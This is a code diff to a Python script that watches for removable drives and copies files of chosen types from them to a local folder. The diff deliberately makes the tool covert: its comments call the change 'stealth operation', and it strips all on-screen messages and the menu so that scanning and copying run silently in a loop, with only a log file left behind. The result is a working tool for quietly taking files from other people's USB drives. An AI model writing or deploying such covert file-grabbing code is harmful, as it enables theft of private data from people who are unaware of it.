@@ -2,6 +2,11 @@ import os
 import psutil
 import time
 import shutil
+import logging
+
+# Set up logging for stealth operation
+logging.basicConfig(filename='file_copy_log.txt', level=logging.INFO, 
+                    format='%(asctime)s - %(levelname)s - %(message)s')
 
 def get_removable_drives():
     drives = []
@@ -10,70 +15,46 @@ def get_removable_drives():
             drives.append(partition.mountpoint)
     return drives
 
-def find_and_copy_files(drive, files_to_find, destination):
-    found_any = False
+def find_and_copy_files(drive, file_types, destination):
     for root, dirs, files in os.walk(drive):
-        for file_name in files_to_find:
-            if file_name in files:
-                file_path = os.path.join(root, file_name)
-                shutil.copy(file_path, destination)
-                print(f"File '{file_name}' found and copied to {destination}")
-                found_any = True
-    if not found_any:
-        print("No specified files found on the drive.")
+        for file in files:
+            if any(file.lower().endswith(ext) for ext in file_types):
+                file_path = os.path.join(root, file)
+                dest_path = os.path.join(destination, os.path.basename(file))
+                
+                # Copy if not already present or if a newer version exists
+                if not os.path.exists(dest_path) or os.path.getmtime(file_path) > os.path.getmtime(dest_path):
+                    try:
+                        shutil.copy(file_path, dest_path)
+                        logging.info(f"File '{file}' copied to {destination}")
+                    except Exception as e:
+                        logging.error(f"Error copying '{file_path}': {e}")
 
 def main():
-    print("Welcome to the File Finder and Copier Program!")
+    # Collect and validate inputs silently
+    file_types = input("Enter file types to search for (e.g., .txt, .jpg, comma-separated): ").split(',')
+    file_types = [ft.strip().lower() for ft in file_types if ft.strip().startswith('.')]
     
-    # Get input for the files to find
-    files_to_find = input("Enter the file names to search for (comma-separated): ").split(',')
-    files_to_find = [file.strip() for file in files_to_find]
-
-    # Get input for the destination path
     destination = input("Enter the destination folder path: ").strip()
     if not os.path.exists(destination):
-        print(f"The destination folder '{destination}' does not exist.")
+        logging.error(f"The destination folder '{destination}' does not exist.")
         return
-
-    # Get input for the scanning interval
+    
+    # Scanning interval
     try:
         interval = int(input("Enter the scanning interval in seconds (default is 2): ").strip())
     except ValueError:
-        interval = 2  # default value
+        interval = 2  # Default
 
-    print("\nProgram is ready. Choose an option:")
-    print("1. Start scanning for files")
-    print("2. Exit the program")
-    
-    while True:
-        choice = input("\nEnter your choice (1 or 2): ").strip()
-        
-        if choice == '1':
-            print("\nStarting the scanning process. Press Ctrl+C to stop.\n")
-            try:
-                while True:
-                    removable_drives = get_removable_drives()
-                    
-                    if removable_drives:
-                        for drive in removable_drives:
-                            print(f"Scanning drive {drive}...")
-                            find_and_copy_files(drive, files_to_find, destination)
-                    else:
-                        print("No removable drives detected.")
-                    
-                    # Wait before the next scan
-                    time.sleep(interval)
-            
-            except KeyboardInterrupt:
-                print("\nScanning stopped by user.")
-            break
-        
-        elif choice == '2':
-            print("Exiting the program.")
-            break
-        
-        else:
-            print("Invalid choice. Please enter 1 or 2.")
+    # Start scanning loop silently
+    try:
+        while True:
+            removable_drives = get_removable_drives()
+            for drive in removable_drives:
+                find_and_copy_files(drive, file_types, destination)
+            time.sleep(interval)
+    except KeyboardInterrupt:
+        logging.info("Scanning stopped by user.")
 
 if __name__ == "__main__":
     main()
